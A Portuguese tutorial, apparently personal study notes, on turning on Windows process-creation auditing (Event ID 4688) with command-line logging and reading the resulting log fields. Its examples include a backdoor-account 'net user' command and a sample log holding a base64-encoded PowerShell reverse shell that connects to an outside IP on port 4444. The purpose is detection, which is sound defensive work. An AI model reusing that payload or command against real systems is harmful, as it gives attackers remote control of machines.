Os eventos de criação de processos são um tipo de evento do Windows que, se ativado, será gravado no Visualizador de Eventos do Windows local como ID de Evento 4688 sempre que um novo processo for iniciado. Eles incluem informações como tempo, nome do processo, processo pai, linha de comando (opcional, mas preferido) e assim por diante.

Um processo num computador Windows é apenas uma aplicação em execução. 
Numa estação de trabalho ou servidor típico, vários processos serão iniciados num dia de trabalho.
A maioria desses processos é inocente, mas o malware geralmente lança um ou mais deles como parte da sua operação. 
Se um invasor obtiver acesso remoto a um sistema, poderá iniciar vários processos para interagir com um computador e atingir os seus objetivos. 
Os eventos de criação de processos permitem registar essa atividade maliciosa e, se registada, ela pode ser identificada e monitorizada.

Quando um programa é executado, muitas vezes é dado parâmetros (também conhecidos como argumentos) para dizer-lhe o que fazer. Esses parâmetros são importantes para os defensores, pois podem fornecer informações precisas sobre a natureza da atividade e a expressão é "linhas de comando" porque elas fornecem contexto para a operação em andamento. Por exemplo, se um comando codificado pelo Powershell for executado num endpoint, os logs de processo mostrarão apenas o nome do processo 'Powershell', mas se também tivermos a linha de comando, poderemos identificar imediatamente o problema.



## Configurar os logs de auditoria de processos

Por padrão, o Windows não tem essas configurações de auditoria de eventos ativadas, portanto, precisamos configurá-las e ativá-las no sistema.

Primeiro, procuramos por edit group policy na barra de pesquisa do Windows.
![[Pasted image 20241126221621.png]]



Em seguida, em Configuração do Computador > Configurações do Windows > Configurações de Segurança > Configuração da Política de Auditoria Avançada > Políticas de Auditoria > Rastreamento detalhado > Criação de Processo de Auditoria

![[Pasted image 20241126221841.png]]

Em seguida, clicamos em "Auditar a criação do processo" > "Sucesso".
![[Pasted image 20241126221913.png]]

Agora também queremos incluir 'CommandLine' para ser registado com a criação do processo. Configuração do Computador > Templates Administrativo > Sistema > Criação de Processos de Auditoria > definir “Incluir linha de comando em eventos de criação de processos” para ativar.

![[Pasted image 20241126222101.png]]

E ativamos a auditoria:
![[Pasted image 20241126222134.png]]

## Análises

Agora todos os logs de criação de processos têm "CommandLine". Vamos filtrar os logs de segurança do Windows para o ID de eventos 4688.

![[Pasted image 20241126222249.png]]

Abri um cmd.exe e executei o comando whoami:
![[Pasted image 20241126222546.png]]


Abrindo o log mais recente em busca dessa operação:

![[Pasted image 20241126222611.png]]
**Nome da conta** A conta de user usada para executar o processo.

**Nome novo do processo** Este campo contém o nome do processo que foi executado e fez com que este evento fosse registado.

**Nome do processo do Criador** Este é essencialmente o processo pai do processo executado. É útil para identificar relações de processo maliciosas, por exemplo, um processo word.exe a chamar o cmd ou PowerShell é suspeito.

**Linha de Comando de Processo** : Isto contém o comando completo e/ou argumentos.




Agora que cobrimos os campos de log de eventos e o que procurar, vamos olhar para um registo mais ofensivo:

![[Pasted image 20241126223137.png]]

Este exemplo mostra-nos o poder da Linha de Comando do Processo. Podemos ver imediatamente o propósito do processo e observar que o processo net.exe foi gerado por cmd.exe e a linha de comando é "net user teste password1 /add".

O net.exe é um binário nativo e é usado para gerir users / grupos num sistema. Neste exemplo, é óbvio que o invasor criou uma conta de user backdoor [MITRE Tactic: T1136], e devido à auditoria da linha de comando, agora temos a senha da conta controlada pelo adversário, bem como para mais contexto.

Podemos identificar muitos eventos de segurança diferentes apenas verificando os logs de processo. Eles devem ser configurados em todos os ambientes empresariais e armazenados numa solução SIEM centralizada.

***
Exemplo de um invasor detetado no event ID 4688:
A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-3522673090-589751185-489205442-1001
	Account Name:		VICTIM
	Account Domain:		DESKTOP-ND2TH2C
	Logon ID:		0x1A9DC

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2654
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x15e4
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANAA2AC4AMgAzAC4AMQA5ADkALgA3ADYAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
***

Vemos que está em base64, decodificando temos o output:

![[Pasted image 20241127225623.png]]

Mas ainda temos bytes nulos a poluir o comando utilizado pelo invasor. Retirando os bytes nulos:
[[Pasted image 20241127225839.png]]

Vemos que o invasor utiliza o protocolo TCP no IP mencionado na porta 4444.